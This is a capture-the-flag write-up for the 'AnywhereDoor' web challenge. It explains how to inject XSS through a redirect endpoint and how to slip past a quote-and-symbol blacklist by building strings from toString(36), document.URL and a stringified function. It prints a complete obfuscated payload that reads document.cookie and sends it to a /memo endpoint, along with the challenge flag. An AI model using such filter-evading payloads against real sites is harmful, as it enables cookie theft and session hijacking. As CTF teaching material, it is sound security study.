## AnywhereDoor

<img src="images/chall.png" width=400>

We are given a webpage with an XSS vulnerability.  

<img src="images/webpage.png" width=500>

It's a pretty standard headless browser redirect exploit, where we have to inject our XSS payload in `/gate`.  

<img src="images/browser.png" width=600>

In `/gate`, the webpage already redirects us to the URL provided, which means our job is already made way easier.  

<img src="images/gate.png" width=600>

However, you may notice that in the script, our URL is not enclosed with quotes by default. To bypass the URL encoding in the `check_xss()` function, we just have to enclose the URL ourselves with backticks.  

Thus, we are able to produce the base exploit.  

```javascript
`/memo?memo=${document.cookie}`
```

Our next task would be to modify our payload to bypass the XSS filter implemented. As we can see below, the filter is very minimal yet it severely limits our options.  

<img src="images/filter.png" width=400>

Since all quotes are blacklisted, we have to find another way to build and concatenate strings.  

We can first split the payload into 2 parts, the `/memo` endpoint and the cookie. To concatenate them, we can store them in an array and join them with an empty string.  

```javascript
[`/memo?memo=`,document.cookie].join(String(0).slice(0,0))
```

`document.cookie` doesn't trigger the blacklist, so we only have to obfuscate the `/memo` enpdoint call. For alphabets, we can convert their ASCII value to strings using `toString(36)`.  

```javascript
(10).toString(36)   // "a"
```

I wrote a small script to obfuscate the string as such. However, the next thing we might notice is that for symbols (`/`, `=`, `?`), a negative ASCII value is produced, which is invalid, hence we need to find other ways to build the symbols individually.  

<img src="images/convert.png" width=600>

For `?`, we can leverage JavaScript's syntax rules by declaring a function with a nullish coalescing operator, then casting it to a string and grabbing the `?` character.  

```javascript
String(function(){1??1})
```

Building `/` and `=` are slightly trickier, since they are directly included in the blacklist. However, recalling that the `/gate` endpoint URL always starts with `http://` and has a `param=` argument, we can leverage the URL itself to get the characters.  

```javascript
document.URL[6]     // "/"
document.URL[32]    // "=" (browser visits http://127.0.0.1:8000/gate?param=)
```

We are finally able to construct the entire payload to retrieve the flag.  

```javascript
[document.URL[6],(22).toString(36),(14).toString(36),(22).toString(36),(24).toString(36),String(function(){1??1})[13],(22).toString(36),(14).toString(36),(22).toString(36),(24).toString(36),document.URL[32],document.cookie].join(String(0).slice(0,0))
```

<img src="images/flag.png" width=600>

Flag: `DH{Jinja2_escapes_quotes_but_what_about_xss}`